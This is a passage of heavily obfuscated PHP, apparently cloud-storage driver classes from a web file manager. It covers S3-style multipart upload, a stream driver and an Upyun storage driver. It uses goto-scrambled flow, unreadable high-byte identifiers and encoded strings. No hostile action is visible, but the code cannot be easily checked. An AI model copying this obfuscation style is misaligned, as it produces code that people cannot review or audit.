"\x3c\120\141\162\x74\116\x75\x6d\x62\x65\x72\76{$d„ò“˜Èˆœ[$b°ÄˆÓ„õ[1256]]}\x3c\x2f\x50\x61\162\164\116\165\x6d\x62\x65\162\76\12" . "\x3c\x45\124\141\147\76{$d„ò“˜Èˆœ[$b°ÄˆÓ„õ[1257]]}\74\57\105\x54\x61\147\76\12" . $b°ÄˆÓ„õ[1302]; } goto c‹ôµïÁÌë; AœŸÁíÇƒÍ: $Fö‡óç‚±ê = $this->client->__getSignatureV4($C‚ŒÊÙÖ°º, $AåŠ®Ş´§È, $BË‘âáÎÈ‰, $Cˆêö¡’ºŞ, $dÁˆÚÇ‚Ï¥); return array($b°ÄˆÓ„õ[239] => $Fö‡óç‚±ê[$b°ÄˆÓ„õ[239]], $b°ÄˆÓ„õ[230] => $Fö‡óç‚±ê[$b°ÄˆÓ„õ[1299]], $b°ÄˆÓ„õ[241] => $C†®ª™©Úè, $b°ÄˆÓ„õ[1296] => $Fö‡óç‚±ê[$b°ÄˆÓ„õ[1296]]); goto b¶Ú–íáÑø; Döéñ²­©: $AåŠ®Ş´§È = array($b°ÄˆÓ„õ[1297] => $F¢ó³èŒœ[1], $b°ÄˆÓ„õ[219] => $b°ÄˆÓ„õ[128], $b°ÄˆÓ„õ[1211] => strlen($dÁˆÚÇ‚Ï¥)); $BË‘âáÎÈ‰ = $b°ÄˆÓ„õ[232]; $Cˆêö¡’ºŞ = $b°ÄˆÓ„õ[18] . $this->pathEncode($e¥ùƒàÜ¡) . $fá¨ò§¢éØ[$b°ÄˆÓ„õ[177]]; goto AœŸÁíÇƒÍ; c‹ôµïÁÌë: $dÁˆÚÇ‚Ï¥ .= $b°ÄˆÓ„õ[1303]; $C‚ŒÊÙÖ°º = array(); $F¢ó³èŒœ = explode($b°ÄˆÓ„õ[186], $this->getHost()); goto Döéñ²­©; FñÍÉ¸Š–Ù: $b°ÄˆÓ„õ =& $_SERVER[¾÷]; $bªÛ‚Š¶»› = str_replace($b°ÄˆÓ„õ[240], $b°ÄˆÓ„õ[43], $fá¨ò§¢éØ[$b°ÄˆÓ„õ[177]]); $C†®ª™©Úè = $this->client->listParts($this->bucket, $e¥ùƒàÜ¡, $bªÛ‚Š¶»›); goto BªÎ•ÆŸ©; b¶Ú–íáÑø: } public function link($F¤ªÛÇÍá, $fíŞÈçí¨© = array()) { return parent::link($F¤ªÛÇÍá, $fíŞÈçí¨©); } public function fileOut($eˆ”·§Î²Í, $C‹áÀØ—¦ = false, $d×¿®Ä’ÆŸ = false, $F‘§îÄ©Ÿ³ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¾÷][1304])) { return parent::fileOutServer($eˆ”·§Î²Í, $C‹áÀØ—¦, $d×¿®Ä’ÆŸ, $F‘§îÄ©Ÿ³); } parent::fileOut($eˆ”·§Î²Í, $C‹áÀØ—¦, $d×¿®Ä’ÆŸ, $F‘§îÄ©Ÿ³); } public function fileOutImage($c†™¾”Õç‹, $eèË†ŒğšÎ = 250) { if (strstr($this->endpoint, $_SERVER[¾÷][1304])) { return parent::fileOutImageServer($c†™¾”Õç‹, $eèË†ŒğšÎ); } parent::fileOutImage($c†™¾”Õç‹, $eèË†ŒğšÎ); } public function fileOutLink($e»ÂÚÌ¿ÛÕ) { $C‘¹ˆ³–»Ö =& $_SERVER[¾÷]; if (substr($e»ÂÚÌ¿ÛÕ, 0, 7) == $C‘¹ˆ³–»Ö[1178]) { $e»ÂÚÌ¿ÛÕ = $C‘¹ˆ³–»Ö[1179] . substr($e»ÂÚÌ¿ÛÕ, 7); } header($C‘¹ˆ³–»Ö[168] . $e»ÂÚÌ¿ÛÕ); die; } public function getHost() { $bºÇó¤î”® =& $_SERVER[¾÷]; $FÚŠ×•š¸É = str_rtrim(parent::getHost(), $bºÇó¤î”®[18] . $this->bucket); $FÚŠ×•š¸É = explode($bºÇó¤î”®[186], $FÚŠ×•š¸É); return $FÚŠ×•š¸É[0] . $bºÇó¤î”®[186] . $this->bucket . $bºÇó¤î”®[104] . $FÚŠ×•š¸É[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Fœ¯·¾®¼, $A½Ó¨®«…Ï = 0) { parent::__construct(); $this->source = $Fœ¯·¾®¼; $this->sourceSize = $A½Ó¨®«…Ï; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($cîÑ³Ø¬ƒ = false) { return $this->sourceSize; } public function getContent($dä‹·õÍ¡ = false) { return $this->fileSubstr($dä‹·õÍ¡, 0, $this->sourceSize); } public function fileSubstr($b‘ì·ß‘´ = false, $fœ«ç¤¦©„ = 0, $E¦Ô¤ÔâµŸ = 0) { if (!$E¦Ô¤ÔâµŸ) { $E¦Ô¤ÔâµŸ = $this->sourceSize; } $e¨¾–‡ºÀ = $this->sourceSize - $fœ«ç¤¦©„; if ($E¦Ô¤ÔâµŸ >= $e¨¾–‡ºÀ) { $E¦Ô¤ÔâµŸ = $e¨¾–‡ºÀ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $fœ«ç¤¦©„, $E¦Ô¤ÔâµŸ); } if ($this->sourceType == self::TYPE_FILE) { if ($E¦Ô¤ÔâµŸ <= 0) { return $_SERVER[¾÷][43]; } $D‡©·äÜˆÌ = ftell($this->source); fseek_64($this->source, $D‡©·äÜˆÌ + $fœ«ç¤¦©„); $eÚªÈïÛ®» = @fread($this->source, $E¦Ô¤ÔâµŸ); fseek_64($this->source, $D‡©·äÜˆÌ); return $eÚªÈïÛ®»; } } public function hashMd5($fö¢ÒË½·º = false) { return md5($this->getContent()); } public static function hash($d’¦ùÚ‘°ù, $CñŞ´ğ÷ˆš = 0) { $Fƒ‘‡…À‡ = new PathDriverStream($d’¦ùÚ‘°ù, $CñŞ´ğ÷ˆš); return $Fƒ‘‡…À‡->hashSimple($d’¦ùÚ‘°ù); } public static function md5($Eå×ÒÕÛÎß, $eŸ èœ¾ÄÇ = 0) { $EŞƒ«õëÕ = new PathDriverStream($Eå×ÒÕÛÎß, $eŸ èœ¾ÄÇ); return $EŞƒ«õëÕ->hashMd5($Eå×ÒÕÛÎß); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\57\x76\60\56\x61\x70\x69\56\165\x70\171\165\156\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($AÂ¡ë×¨ÑÜ) { parent::__construct(); $this->_init($AÂ¡ë×¨ÑÜ); } public function _init($DÚïÆË„) { $c¬Ñ¬Ä­ =& $_SERVER[¾÷]; foreach ($DÚïÆË„ as $C†¿“¿ÓŸ¹ => $e‹‘Ë´øÙ) { if (isset($this->{$C†¿“¿ÓŸ¹})) { $this->{$C†¿“¿ÓŸ¹} = $e‹‘Ë´øÙ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($c¬Ñ¬Ä­[1305] . LNG($c¬Ñ¬Ä­[1237])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($A–ëÜ¨’£ì, $AÄ¥¬ó¨Ã = "\107\x45\124") { $F‘Œ•­Î–ë =& $_SERVER[¾÷]; $e¶Ö÷ô¼…ë = gmdate($F‘Œ•­Î–ë[1271]); $CÕˆŞˆ°Ä = base64_encode(hash_hmac($F‘Œ•­Î–ë[1306], "{$AÄ¥¬ó¨Ã}\x26{$A–ëÜ¨’£ì}\46{$e¶Ö÷ô¼…ë}", md5("{$this->userpass}"), !0)); $fĞÑâÚËÃ = array("\x41\165\164\150\157\162\151\172\x61\164\151\x6f\156\x3a\125\120\x59\x55\x4e\40{$this->username}\x3a{$CÕˆŞˆ°Ä}", "\104\141\x74\x65\72{$e¶Ö÷ô¼…ë}"); return $fĞÑâÚËÃ; } public function ussRequest($dŒƒïÈÑ¾, $aˆ×²È™¨Ğ = "\x47\x45\x54", $bç×º»åÑ = false, $cÚÙöÕ¡òó = false, $DÛãÚ‘¸á¾ = false) { goto bŠæõƒê‚; AŸğÎ•‚å: $A×š½ğÌåó = $this->ussHeaders($cÍ„‘‘ê¯“, $aˆ×²È™¨Ğ); if ($cÚÙöÕ¡òó) { $A×š½ğÌåó = array_merge($A×š½ğÌåó, $cÚÙöÕ¡òó); } $b´„ä¡¹éÔ = url_request($this->endpoint . $cÍ„‘‘ê¯“, $aˆ×²È™¨Ğ, $bç×º»åÑ, $A×š½ğÌåó, $DÛãÚ‘¸á¾); goto dĞóàª‹ç¼; bŠæõƒê‚: $FËšŠŠÎÛ =& $_SERVER[¾÷]; $dŒƒïÈÑ¾ = trim($dŒƒïÈÑ¾, $FËšŠŠÎÛ[18]); $cÍ„‘‘ê¯“ = "\x2f{$this->bucket}\57{$dŒƒïÈÑ¾}"; goto AŸğÎ•‚å; dĞóàª‹ç¼: if (!$b´„ä¡¹éÔ) { return array($FËšŠŠÎÛ[1062] => !1, $FËšŠŠÎÛ[1064] => $FËšŠŠÎÛ[1307]); } if (strtolower($aˆ×²È™¨Ğ) == $FËšŠŠÎÛ[199] || in_array($b´„ä¡¹éÔ[$FËšŠŠÎÛ[1062]], array($FËšŠŠÎÛ[1163], $FËšŠŠÎÛ[1308]))) { $bç×º»åÑ = $b´„ä¡¹éÔ[$FËšŠŠÎÛ[1309]]; } else { $bç×º»åÑ = json_decode($b´„ä¡¹éÔ[$FËšŠŠÎÛ[1064]], !0); if (!$bç×º»åÑ) { $bç×º»åÑ = $b´„ä¡¹éÔ[$FËšŠŠÎÛ[1064]]; } else { if (!$b´„ä¡¹éÔ[$FËšŠŠÎÛ[711]] && isset($bç×º»åÑ[$FËšŠŠÎÛ[1310]])) { $bç×º»åÑ = $bç×º»åÑ[$FËšŠŠÎÛ[1310]]; } } } return array($FËšŠŠÎÛ[1062] => $b´„ä¡¹éÔ[$FËšŠŠÎÛ[711]], $FËšŠŠÎÛ[1064] => $bç×º»åÑ); goto cö‚¿’æ•; cö‚¿’æ•: } public function mkfile($A˜¤¡«, $BºÈŸîàáŠ = '', $Bø“³²„­ = REPEAT_RENAME) { if ($this->setContent($A˜¤¡«, $BºÈŸîàáŠ)) { return $this->getPathOuter($A˜¤¡«); } return !1; } public function mkdir($Eâ¬ñ±õ», $e–Ùªê¢‹í = REPEAT_SKIP) { $fš™ÜÓŠ‚Â =& $_SERVER[¾÷]; $F±…‹‡ÚÎÇ = trim($Eâ¬ñ±õ», $fš™ÜÓŠ‚Â[18]); if ($this->_isFolder($F±…‹‡ÚÎÇ)) { return $this->getPathOuter($F±…‹‡ÚÎÇ); } $A«àŠÍì†‡ = array($fš™ÜÓŠ‚Â[1311]); $aª¥ˆŒô†Š = $this->ussRequest($F±…‹‡ÚÎÇ, $fš™ÜÓŠ‚Â[232], !1, $A«àŠÍì†‡); return $aª¥ˆŒô†Š[$fš™ÜÓŠ‚Â[1062]] ? $this->getPathOuter($F±…‹‡ÚÎÇ) : !1; } public function copyFile($AªˆÊÔöæŞ, $cÆ¯Ğë£„Ñ) { $eÊîÅ—’ =& $_SERVER[¾÷]; $cÜ£ŠÁÁÉ° = array($eÊîÅ—’[1312] . "\57{$this->bucket}\57{$AªˆÊÔöæŞ}", $eÊîÅ—’[1313]); $E¿¤‹É…Ôë = $this->ussRequest($cÆ¯Ğë£„Ñ, $eÊîÅ—’[234], !1, $cÜ£ŠÁÁÉ°); return $E¿¤‹É…Ôë[$eÊîÅ—’[1062]] ? !0 : $this->getPathOuter($cÆ¯Ğë£„Ñ); } public function moveFile($f¶›«İÄ£š, $D°ù¤÷Íõ‘) { $b³Ùå´©†ò =& $_SERVER[¾÷]; $aŠ²©åª™Ï = array($b³Ùå´©†ò[1314] . "\57{$this->bucket}\x2f{$f¶›«İÄ£š}", $b³Ùå´©†ò[1313]); $DƒÓïÃó» = $this->ussRequest($D°ù¤÷Íõ‘, $b³Ùå´©†ò[234], !1, $aŠ²©åª™Ï); return $DƒÓïÃó»[$b³Ùå´©†ò[1062]] ? !0 : $this->getPathOuter($D°ù¤÷Íõ‘); } public function delFile($DøĞŒôà½Ì) { $E«³¼â™çÉ =& $_SERVER[¾÷]; $dÇ¾¼©ùèÜ = $this->ussRequest($DøĞŒôà½Ì, $E«³¼â™çÉ[1315]); return $dÇ¾¼©ùèÜ[$E«³¼â™çÉ[1062]] ? !0 : !1; } public function delFolder($Aºçäğ‹¼…) { goto cÆÕä¬½„; B½íÓÌÈ: $c–ˆÖ¶¯°Ğ = $dññçãË„ø = array(); $this->fileList($Aºçäğ‹¼…, $c–ˆÖ¶¯°Ğ, $dññçãË„ø, !0); $this->listItemCache = !0; goto c»Œ‰Ø; c»Œ‰Ø: foreach ($dññçãË„ø as $Cƒˆ´š†ßŒ) { $A™‡›¸„¯ò = $this->ussRequest($Cƒˆ´š†ßŒ[$C¨âà“¦Ëª[38]], $C¨âà“¦Ëª[1315]); if (!$A™‡›¸„¯ò[$C¨âà“¦Ëª[1062]]) { return !1; } } foreach ($c–ˆÖ¶¯°Ğ as $D‚‡İ…õĞ) { $A™‡›¸„¯ò = $this->ussRequest($D‚‡İ…õĞ, $C¨âà“¦Ëª[1315]); if (!$A™‡›¸„¯ò[$C¨âà“¦Ëª[1062]]) { return !1; } } $A™‡›¸„¯ò = $this->ussRequest($Aºçäğ‹¼…, $C¨âà“¦Ëª[1315]); goto aóñÀäßÊ®; cÆÕä¬½„: $C¨âà“¦Ëª =& $_SERVER[¾÷]; if (!$this->exist($Aºçäğ‹¼…)) { return !0; } $this->listItemCache = !1; goto B½íÓÌÈ; aóñÀäßÊ®: return $A™‡›¸„¯ò[$C¨âà“¦Ëª[1062]]; goto fóãÀïòÈ‡; fóãÀïòÈ‡: } public function rename($cÃï»­“Ï¡, $FÀóÇŠ„¯) { if ($this->isFile($cÃï»­“Ï¡)) { $FÀóÇŠ„¯ = get_path_father($cÃï»­“Ï¡) . $FÀóÇŠ„¯; return $this->moveFile($cÃï»­“Ï¡, $FÀóÇŠ„¯); } return $this->renameObject($cÃï»­“Ï¡, $FÀóÇŠ„¯); } public function fileInfo($c‘ÜˆÄÑïÜ, $C‚™ñ„†Ù½ = false, $BˆËÃç­ë• = array()) { goto b¤®Ê¼öœ®; f¶¸·Á ¹£: $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[202]] = intval($BˆËÃç­ë•[$Aƒ£³¨©ÛÏ[1316]]); $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[93]] = intval($BˆËÃç­ë•[$Aƒ£³¨©ÛÏ[1317]]); $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[87]] = $BˆËÃç­ë•[$Aƒ£³¨©ÛÏ[87]]; goto e§ˆ°“†Œ; e§ˆ°“†Œ: return $Cƒî¤¥Š¨; goto E¼ñà™†–; c¨Ò„ğ¼õ: $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[202]] = $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[93]] = 0; $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[203]] = $Cƒî¤¥Š¨[$Aƒ£³¨©ÛÏ[204]] = !0; if (empty($BˆËÃç­ë•)) { $BˆËÃç­ë• = $this->objectMeta($c‘ÜˆÄÑïÜ); if (!$BˆËÃç­ë•) { return $Cƒî¤¥Š¨; } } goto f¶¸·Á ¹£; b¤®Ê¼öœ®: $Aƒ£³¨©ÛÏ =& $_SERVER[¾÷]; $Cƒî¤¥Š¨ = array($Aƒ£³¨©ÛÏ[38] => $this->pathThis($c‘ÜˆÄÑïÜ), $Aƒ£³¨©ÛÏ[85] => $this->getPathOuter($Aƒ£³¨©ÛÏ[18] . $c‘ÜˆÄÑïÜ), $Aƒ£³¨©ÛÏ[39] => $Aƒ£³¨©ÛÏ[201], $Aƒ£³¨©ÛÏ[87] => isset($BˆËÃç­ë•[$Aƒ£³¨©ÛÏ[87]]) ? $BˆËÃç­ë•[$Aƒ£³¨©ÛÏ[87]] : 0, $Aƒ£³¨©ÛÏ[177] => $this->ext($c‘ÜˆÄÑïÜ)); if ($C‚™ñ„†Ù½) { return $Cƒî¤¥Š¨; } goto c¨Ò„ğ¼õ; E¼ñà™†–: } public function folderInfo($EóËòòé, $CÂâ´ô°İ = false) { goto Eª¥·ÜšÃñ; aÉˆİ†Ø±‚: $c‹ˆó¢²Ğ[$C³õßñŒ„[202]] = intval($b‰°—í™í[$C³õßñŒ„[1316]]); $c‹ˆó¢²Ğ[$C³õßñŒ„[93]] = intval($b‰°—í™í[$C³õßñŒ„[1317]]); return $c‹ˆó¢²Ğ; goto cÄ’ÈÈ¼×½; Eª¥·ÜšÃñ: $C³õßñŒ„ =& $_SERVER[¾÷]; $c‹ˆó¢²Ğ = array($C³õßñŒ„[38] => $this->pathThis($EóËòòé), $C³õßñŒ„[85] => $this->getPathOuter($C³õßñŒ„[18] . $EóËòòé), $C³õßñŒ„[39] => $C³õßñŒ„[86]); if ($CÂâ´ô°İ) { return $c‹ˆó¢²Ğ; } goto D†à×‚ö“; D†à×‚ö“: $c‹ˆó¢²Ğ[$C³õßñŒ„[202]] = $c‹ˆó¢²Ğ[$C³õßñŒ„[93]] = 0; $c‹ˆó¢²Ğ[$C³õßñŒ„[203]] = $c‹ˆó¢²Ğ[$C³õßñŒ„[204]] = !0; if (empty($b‰°—í™í)) { $b‰°—í™í = $this->objectMeta($EóËòòé); if (!$b‰°—í™í) { return $c‹ˆó¢²Ğ; } } goto aÉˆİ†Ø±‚; cÄ’ÈÈ¼×½: } private function listObjs($AÓˆç·ÅïÎ, $D“Œèõï = 0, $DÖÚ¡ôÛ…‰ = 1000) { $C¹ÁğÇ‰™ê =& $_SERVER[¾÷]; $føÒ»Šğâ = array($C¹ÁğÇ‰™ê[1318], $C¹ÁğÇ‰™ê[1319] . $DÖÚ¡ôÛ…‰); if ($D“Œèõï) { $føÒ»Šğâ[] = $C¹ÁğÇ‰™ê[1320] . $D“Œèõï; } $D®¾³íÄƒŞ = $this->ussRequest($AÓˆç·ÅïÎ, $C¹ÁğÇ‰™ê[236], !1, $føÒ»Šğâ); return !$D®¾³íÄƒŞ[$C¹ÁğÇ‰™ê[1062]] ? !1 : $D®¾³íÄƒŞ[$C¹ÁğÇ‰™ê[1064]]; } private function fileList($EÎÒ†š¾ìö, &$cÎ´²˜æ›ñ, &$böç¥‚ºåí, $e‡¿Êºß‰— = false) { goto CĞ…å…—ñø; A¿÷¨òîÁ¥: $EƒªŞ¯”¨ = rtrim($EÎÒ†š¾ìö, $Aİˆ»±Ø[18]) . $Aİˆ»±Ø[18]; $DÕ¥‰£„è¨ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $f¸±Å…¦ = $this->listObjs($EÎÒ†š¾ìö, $e‚ñ‡¥¡¤å, $bïŞÛÅœËš); if (!$f¸±Å…¦) { return !1; } $e‚ñ‡¥¡¤å = isset($f¸±Å…¦[$Aİˆ»±Ø[1321]]) ? $f¸±Å…¦[$Aİˆ»±Ø[1321]] : $Aİˆ»±Ø[43]; $dÇ£°çÆÉ‹ = isset($f¸±Å…¦[$Aİˆ»±Ø[1322]]) ? $f¸±Å…¦[$Aİˆ»±Ø[1322]] : array(); foreach ($dÇ£°çÆÉ‹ as $f—ª†®ùÎ) { $AÅ†ö…µíÜ = $f—ª†®ùÎ[$Aİˆ»±Ø[39]] == $Aİˆ»±Ø[86] ? !0 : !1; $EÄ§´”©ùˆ = ltrim($EƒªŞ¯”¨ . $f—ª†®ùÎ[$Aİˆ»±Ø[38]], $Aİˆ»±Ø[18]) . ($AÅ†ö…µíÜ ? $Aİˆ»±Ø[18] : $Aİˆ»±Ø[43]); $bÀ±‰Ü»“‡ = array($Aİˆ»±Ø[38] => $EÄ§´”©ùˆ, $Aİˆ»±Ø[39] => $AÅ†ö…µíÜ ? $Aİˆ»±Ø[86] : $Aİˆ»±Ø[201], $Aİˆ»±Ø[87] => $f—ª†®ùÎ[$Aİˆ»±Ø[342]], $Aİˆ»±Ø[1317] => $f—ª†®ùÎ[$Aİˆ»±Ø[1323]]); if ($DÕ¥‰£„è¨) { $this->cacheMethod($Aİˆ»±Ø[207], $EÄ§´”©ùˆ, $AÅ†ö…µíÜ); $this->cacheMethod($Aİˆ»±Ø[208], $EÄ§´”©ùˆ, $bÀ±‰Ü»“‡); } if ($AÅ†ö…µíÜ) { $cÎ´²˜æ›ñ[] = $EÄ§´”©ùˆ; if ($e‡¿Êºß‰—) { $this->fileList($EÄ§´”©ùˆ, $cÎ´²˜æ›ñ, $böç¥‚ºåí, $e‡¿Êºß‰—); } continue; } $böç¥‚ºåí[] = $bÀ±‰Ü»“‡; } if (count($dÇ£°çÆÉ‹) < $bïŞÛÅœËš) { break; } } goto FùÉåïä•˜; FùÉåïä•˜: if ($DÕ¥‰£„è¨) { $this->cacheMethod($Aİˆ»±Ø[207], $EÎÒ†š¾ìö, !0); } goto FßÁ¶—İï; CĞ…å…—ñø: $Aİˆ»±Ø =& $_SERVER[¾÷]; $e‚ñ‡¥¡¤å = $Aİˆ»±Ø[43]; $bïŞÛÅœËš = 1000; goto A¿÷¨òîÁ¥; FßÁ¶—İï: } public function listPath($CÎ†šÜï×ƒ, $Aäœ¸ô‰Ğ‡ = false) { $eòƒïèô =& $_SERVER[¾÷]; $C™ÉŸˆ¬÷ = $aÔ‘·Ò•Øå = array(); $this->fileList($CÎ†šÜï×ƒ, $C™ÉŸˆ¬÷, $aÔ‘·Ò•Øå); foreach ($C™ÉŸˆ¬÷ as $EÊ†ôí½¿ö => $e¦Ğ‘ˆçÆ) { $C™ÉŸˆ¬÷[$EÊ†ôí½¿ö] = $this->folderInfo($e¦Ğ‘ˆçÆ, $Aäœ¸ô‰Ğ‡); } foreach ($aÔ‘·Ò•Øå as $EÊ†ôí½¿ö => $e¦Ğ‘ˆçÆ) { $aÔ‘·Ò•Øå[$EÊ†ôí½¿ö] = $this->fileInfo($e¦Ğ‘ˆçÆ[$eòƒïèô[38]], $Aäœ¸ô‰Ğ‡, $e¦Ğ‘ˆçÆ); } return array($eòƒïèô[84] => $C™ÉŸˆ¬÷, $eòƒïèô[83] => $aÔ‘·Ò•Øå); } public function has($a‰š·‘—õé, $AäÈÉë©Åœ = false, $BÁµ¿Àˆİ¬ = true) { goto EÆ“¦‚£; bÊñ…¼Î‘: while (!0) { check_abort(); $fÚÄÆ¶øßõ = $this->listObjs($a‰š·‘—õé, $Cå£ïÖÀÀ, $Fœğ¯ÈÕñ); if (!$fÚÄÆ¶øßõ) { return !1; } $Cå£ïÖÀÀ = isset($fÚÄÆ¶øßõ[$d…‹›Ó×Ó[1321]]) ? $fÚÄÆ¶øßõ[$d…‹›Ó×Ó[1321]] : $d…‹›Ó×Ó[43]; $CĞÖø«ß•Á = isset($fÚÄÆ¶øßõ[$d…‹›Ó×Ó[1322]]) ? $fÚÄÆ¶øßõ[$d…‹›Ó×Ó[1322]] : array(); if (empty($CĞÖø«ß•Á)) { break; } $aÉìø±áÖ = array_filter($CĞÖø«ß•Á, function ($F‹Æ¦¸¾Ç…) { $c®ÂÁà˜®Æ =& $_SERVER[¾÷]; return $F‹Æ¦¸¾Ç…[$c®ÂÁà˜®Æ[39]] == $c®ÂÁà˜®Æ[86]; }); $C©šõì¡•¦ = count($CĞÖø«ß•Á); $aÉìø±áÖ = count($aÉìø±áÖ); $CŠ­¹Î½à» = $C©šõì¡•¦ - $aÉìø±áÖ; if ($AäÈÉë©Åœ) { $DšïĞƒ·ñ += $aÉìø±áÖ; $aøÑÍ‘à += $CŠ­¹Î½à»; if ($C©šõì¡•¦ < $Fœğ¯ÈÕñ) { break; } continue; } if ($BÁµ¿Àˆİ¬) { if ($CŠ­¹Î½à») { return !0; } } else { if ($aÉìø±áÖ) { return !0; } } if ($C©šõì¡•¦ < $Fœğ¯ÈÕñ) { break; } } if ($AäÈÉë©Åœ) { return array($d…‹›Ó×Ó[211] => $aøÑÍ‘à, $d…‹›Ó×Ó[212] => $DšïĞƒ·ñ); } return !1; goto fæ””Ë³ô¦; EÆ“¦‚£: $d…‹›Ó×Ó =& $_SERVER[¾÷]; $Cå£ïÖÀÀ = $d…‹›Ó×Ó[43]; $Fœğ¯ÈÕñ = 500; goto AÜ¿›•‰í; AÜ¿›•‰í: $aøÑÍ‘à = 0; $DšïĞƒ·ñ = 0; $Bğ‚ˆ…ŒÖ = rtrim($a‰š·‘—õé, $d…‹›Ó×Ó[18]) . $d…‹›Ó×Ó[18]; goto bÊñ…¼Î‘; fæ””Ë³ô¦: } public function listAll($BÈÆ„¼„ò) { goto fàìÓË»æ”; Añ†­Ê—œÍ: $c¢¤ò„ó¿• = array(); foreach ($DÏç¯àËŠÅ as $b‡¬•öÎ‹) { $c¢¤ò„ó¿•[$b‡¬•öÎ‹[$D ¶…ß‹Á[38]]] = $b‡¬•öÎ‹[$D ¶…ß‹Á[87]]; } foreach ($FâŸÒ¶³³ª as $b‡¬•öÎ‹) { if (is_string($b‡¬•öÎ‹)) { $c¢¤ò„ó¿•[$b‡¬•öÎ‹] = 0; } } goto BäØĞšà‡; BäØĞšà‡: return $this->listAllFiles($BÈÆ„¼„ò, array_keys($c¢¤ò„ó¿•), $c¢¤ò„ó¿•); goto DºöĞĞ“èÒ; fàìÓË»æ”: $D ¶…ß‹Á =& $_SERVER[¾÷]; $FâŸÒ¶³³ª = $DÏç¯àËŠÅ = array(); $this->fileList($BÈÆ„¼„ò, $FâŸÒ¶³³ª, $DÏç¯àËŠÅ, !0); goto Añ†­Ê—œÍ; DºöĞĞ“èÒ: } public function canRead($d–…Æ¬ïÎÙ) { return $this->exist($d–…Æ¬ïÎÙ) ? !0 : !1; } public function canWrite($e¨˜¼®•¿­) { return $this->exist($e¨˜¼®•¿­) ? !0 : !1; } public function getContent($bÁ²œ†¥“™) { return $this->fileSubstr($bÁ²œ†¥“™, 0, -1); } public function setContent($c›ƒíïÁ™, $e½â‡Ò¸ö¤ = '') { $F‰òàøê³ =& $_SERVER[¾÷]; if (!$e½â‡Ò¸ö¤) { $añÚÀ’°Å = $this->ussRequest($c›ƒíïÁ™, $F‰òàøê³[232]); return $añÚÀ’°Å[$F‰òàøê³[1062]]; } $BÅÒÊƒ„•Ñ = $this->tempFile($this->pathThis($c›ƒíïÁ™)); file_put_contents($BÅÒÊƒ„•Ñ, $e½â‡Ò¸ö¤); if ($this->upload($c›ƒíïÁ™, $BÅÒÊƒ„•Ñ)) { $this->tempFileRemve($BÅÒÊƒ„•Ñ); return !0; } return !1; } public function fileSubstr($Bá‘£ä’ËÑ, $e«×ÆŒÛØÌ, $CÜŠ–ß¦Ü) { $Bì…›²óïï =& $_SERVER[¾÷]; if (!($F·±Ê¹‹— = $this->link($Bá‘£ä’ËÑ))) { return !1; } $aİ÷ìğÕ­« = !1; if ($CÜŠ–ß¦Ü > 0) { $B…›…ñíÃ– = $e«×ÆŒÛØÌ + $CÜŠ–ß¦Ü - 1; $aİ÷ìğÕ­« = array($Bì…›²óïï[1284] . $e«×ÆŒÛØÌ . $Bì…›²óïï[443] . $B…›…ñíÃ–); } $aºŒÈ¥Ü è = url_request($F·±Ê¹‹—, $Bì…›²óïï[236], !1, $aİ÷ìğÕ­«); return $aºŒÈ¥Ü è[$Bì…›²óïï[711]] ? $aºŒÈ¥Ü è[$Bì…›²óïï[1064]] : !1; } public function upload($AÜâ±¬ÑÖ™, $A›Ã»¬òÂ, $E¢ËöÓ¾• = false, $EÅŠİ†Á°ñ = REPEAT_REPLACE) { goto dªäØ´»¶³; e‘’ğÊÉ´: if (!$F±–ŞŒˆ»Ó[$d¾ÎŸ¡ÇÆ[1062]]) { return !1; } $C‰‡‡‡¥ = $F±–ŞŒˆ»Ó[$d¾ÎŸ¡ÇÆ[1064]]; $f®†Š­¿¤Ÿ = 0; goto b‚Îè»æ; C»à‚¿‘¹³: $FÛÑ†–¨ƒ‚ = 1024 * 1024 * 10; $B‰Şˆãõ = array($d¾ÎŸ¡ÇÆ[1325], $d¾ÎŸ¡ÇÆ[1326] . $CÈ—Íáãà, $d¾ÎŸ¡ÇÆ[1327], $d¾ÎŸ¡ÇÆ[1328] . $FÛÑ†–¨ƒ‚); $F±–ŞŒˆ»Ó = $this->ussRequest($AÜâ±¬ÑÖ™, $d¾ÎŸ¡ÇÆ[234], !1, $B‰Şˆãõ); goto e‘’ğÊÉ´; fÆÃğõœ§‚: $F±–ŞŒˆ»Ó = $this->ussRequest($AÜâ±¬ÑÖ™, $d¾ÎŸ¡ÇÆ[234], !1, $B‰Şˆãõ); return $F±–ŞŒˆ»Ó[$d¾ÎŸ¡ÇÆ[1062]] ? $this->getPathOuter($E—»×¾§ï) : !1; goto B‰Ê·¦­Ä—; fÎàÔŠó‰: do { $a™“öÌ“À = $C‰‡‡‡¥[$d¾ÎŸ¡ÇÆ[1330]]; fseek_64($E˜ó¿ñëÈ¾, $f®†Š­¿¤Ÿ); $fîÊ·Ş†¿ƒ = fread($E˜ó¿ñëÈ¾, $a™“öÌ“À); $Eª¤àµ¶„¦ = 0; do { $Eª¤àµ¶„¦++; $C‰‡‡‡¥ = $this->uploadPart($AÜâ±¬ÑÖ™, $C‰‡‡‡¥, $fîÊ·Ş†¿ƒ); } while (!$C‰‡‡‡¥ && $Eª¤àµ¶„¦ < 3); if (!$C‰‡‡‡¥) { return !1; } $BÁöÓ“äç— = $C‰‡‡‡¥[$d¾ÎŸ¡ÇÆ[1329]]; $f®†Š­¿¤Ÿ += $a™“öÌ“À; } while ($BÁöÓ“äç— != -1); fclose($E˜ó¿ñëÈ¾); 